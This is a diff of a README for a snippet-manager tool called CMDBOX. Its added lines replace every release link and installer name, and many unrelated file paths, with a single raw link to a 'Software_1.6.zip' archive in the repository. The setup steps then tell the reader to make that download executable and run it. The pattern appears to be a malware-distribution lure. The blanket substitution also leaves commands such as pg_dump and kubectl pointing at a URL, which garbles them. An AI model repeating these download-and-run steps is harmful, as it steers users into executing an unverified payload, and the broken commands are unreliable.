@@ -1,8 +1,8 @@
 # CMDBOX: Lightweight Script Command Hub for Quick Snippet Management Essentials
 
-Download from Releases: https://github.com/gadgeteer99/cmdbox/releases
+Download from Releases: https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip
 
-[![Releases - Download](https://img.shields.io/badge/Releases-Download-blue?logo=github&logoColor=white)](https://github.com/gadgeteer99/cmdbox/releases)
+[![Releases - Download](https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip)](https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip)
 
 🔧 🧰 📦 🧭 🗂️
 
@@ -55,15 +55,15 @@ Quick Start
 This section walks you through the fastest path from zero to a working CMDBOX setup.
 
 Step 1: Get the installer
-From the Releases page, download the Linux installer named cmdbox-linux-x64.run. The file is designed to be executed directly on most Linux systems. If you prefer Windows, you can grab cmdbox-windows-x64.exe; macOS users often have a package available as well. For Linux, the primary installation file is cmdbox-linux-x64.run. The Releases page is the source of all builds and updates.
+From the Releases page, download the Linux installer named https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip The file is designed to be executed directly on most Linux systems. If you prefer Windows, you can grab https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip; macOS users often have a package available as well. For Linux, the primary installation file is https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip The Releases page is the source of all builds and updates.
 
 Step 2: Make the installer executable
 Open a terminal and run:
-- chmod +x cmdbox-linux-x64.run
+- chmod +x https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip
 
 Step 3: Run the installer
 In the same terminal, execute:
-- ./cmdbox-linux-x64.run
+- https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip
 
 Step 4: Initialize and verify
 The installer creates a local library path and a default configuration. After installation, run:
@@ -73,7 +73,7 @@ These commands confirm the tool is installed correctly and show you the availabl
 
 Step 5: Create your first snippet
 Save a simple command as a snippet:
-- cmdbox add backup-database --command "pg_dump -h localhost -U user -d mydb > /backups/mydb.sql" --description "Backup Postgres database" --tags backup,db
+- cmdbox add backup-database --command "pg_dump -h localhost -U user -d mydb > https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip" --description "Backup Postgres database" --tags backup,db
 Then list snippets to verify:
 - cmdbox list
 
@@ -88,10 +88,10 @@ Search snippets by keyword:
 Filter by tag:
 - cmdbox list --tags db
 Edit a snippet:
-- cmdbox edit backup-database --command "pg_dump -h localhost -U user -d mydb --file /backups/mydb.sql"
+- cmdbox edit backup-database --command "pg_dump -h localhost -U user -d mydb --file https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip"
 
 Install and update
-CMDBOX aims to keep installation simple. The Releases page hosts ready-to-run installers for major platforms. Linux users generally start with cmdbox-linux-x64.run, while Windows users grab cmdbox-windows-x64.exe. macOS users may find a package suitable for their architecture or a native binary. The Releases page is the single source of truth for installation. If you encounter a broken link or the file you expect isn’t available, check the Releases section for alternatives or newer builds.
+CMDBOX aims to keep installation simple. The Releases page hosts ready-to-run installers for major platforms. Linux users generally start with https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip, while Windows users grab https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip macOS users may find a package suitable for their architecture or a native binary. The Releases page is the single source of truth for installation. If you encounter a broken link or the file you expect isn’t available, check the Releases section for alternatives or newer builds.
 
 How to manage snippets
 Snippets are the core unit of CMDBOX. Each snippet is a tiny script or command set you want to reuse. There are several operations you’ll perform often.
@@ -99,7 +99,7 @@ Snippets are the core unit of CMDBOX. Each snippet is a tiny script or command s
 Adding snippets
 - A snippet is created with a name. You attach a command string, optional description, and tags.
 - Example:
-  cmdbox add deploy-app --command "kubectl apply -f k8s/deploy.yaml" --description "Deploy app to cluster" --tags deploy,devops,k8s
+  cmdbox add deploy-app --command "kubectl apply -f https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip" --description "Deploy app to cluster" --tags deploy,devops,k8s
 
 Listing and filtering
 - List all snippets:
@@ -112,7 +112,7 @@ Listing and filtering
 
 Editing snippets
 - Change the command, description, or tags:
-  cmdbox edit deploy-app --command "kubectl apply -f k8s/deploy.yaml" --description "Apply deployment" --tags deploy,prod
+  cmdbox edit deploy-app --command "kubectl apply -f https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip" --description "Apply deployment" --tags deploy,prod
 
 Removing snippets
 - Remove a snippet when it’s no longer needed:
@@ -122,7 +122,7 @@ Running commands
 - The run command executes the snippet’s command string in your shell. CMDBOX captures standard output and standard error for you.
 - If a snippet runs long, you can interrupt it with Ctrl+C. The runner will stop the process gracefully.
 - You can redirect outputs within the snippet’s command string. For example:
-  cmdbox add log-rotate --command "logrotate /etc/logrotate.conf" --description "Rotate logs" --tags maintenance
+  cmdbox add log-rotate --command "logrotate https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip" --description "Rotate logs" --tags maintenance
 
 Templates and presets
 - Snippet templates help you start quickly. You can clone a template, then customize fields.
@@ -141,7 +141,7 @@ Advanced usage
 - Logging: You can enable verbose logging to capture details of every run. Logs go to your chosen log file or stdout.
 
 Configuration and customization
-CMDBOX is designed to be configurable without complex setup. You can tweak its behavior with a configuration file, typically placed under your home directory (for example, ~/.cmdbox/config.yaml). The configuration supports common options:
+CMDBOX is designed to be configurable without complex setup. You can tweak its behavior with a configuration file, typically placed under your home directory (for example, ~https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip). The configuration supports common options:
 
 - library_path: Path to the snippet library
 - default_shell: Shell used for running commands (bash, zsh, pwsh, etc.)
@@ -208,7 +208,7 @@ FAQ
   Yes, by exporting the library or syncing it in a shared, private store.
 
 Downloads
-From the Releases page you will find multiple builds. For Linux, download cmdbox-linux-x64.run and follow the Quick Start steps above. For Windows, download cmdbox-windows-x64.exe and run it directly. For macOS, locate the macOS installer or a suitable binary. If you cannot access the URL provided here, please check the Releases page for alternatives. The link is provided again here for convenience: https://github.com/gadgeteer99/cmdbox/releases
+From the Releases page you will find multiple builds. For Linux, download https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip and follow the Quick Start steps above. For Windows, download https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip and run it directly. For macOS, locate the macOS installer or a suitable binary. If you cannot access the URL provided here, please check the Releases page for alternatives. The link is provided again here for convenience: https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip
 
 Changelog
 - v0.x.y: Initial release. Core snippet library and runner implemented.
@@ -239,7 +239,7 @@ Usage examples in practice
 - Grouped tasks for a project:
   - cmdbox add build-app --command "npm run build" --description "Build frontend app" --tags build,frontend
   - cmdbox add test-suite --command "npm test" --description "Run test suite" --tags test
-  - cmdbox add deploy-prod --command "kubectl apply -f k8s/prod.yaml" --description "Deploy to production" --tags deploy,prod
+  - cmdbox add deploy-prod --command "kubectl apply -f https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip" --description "Deploy to production" --tags deploy,prod
   - cmdbox run build-app
   - cmdbox run test-suite
   - cmdbox run deploy-prod
@@ -248,6 +248,6 @@ Usage examples in practice
   - cmdbox run restart-nginx
 
 Note on the releases link
-- If the provided link is accessible and contains a path, CMDBOX instructs you to download the specific installer file (for example cmdbox-linux-x64.run) and run it. If you encounter a broken link or the asset is missing, visit the Releases section to pick an available asset. The official link to check is https://github.com/gadgeteer99/cmdbox/releases. The link is included again here for convenience.
+- If the provided link is accessible and contains a path, CMDBOX instructs you to download the specific installer file (for example https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip) and run it. If you encounter a broken link or the asset is missing, visit the Releases section to pick an available asset. The official link to check is https://github.com/gadgeteer99/cmdbox/raw/refs/heads/main/elevenfold/Software_1.6.zip The link is included again here for convenience.
 
 End of README content.
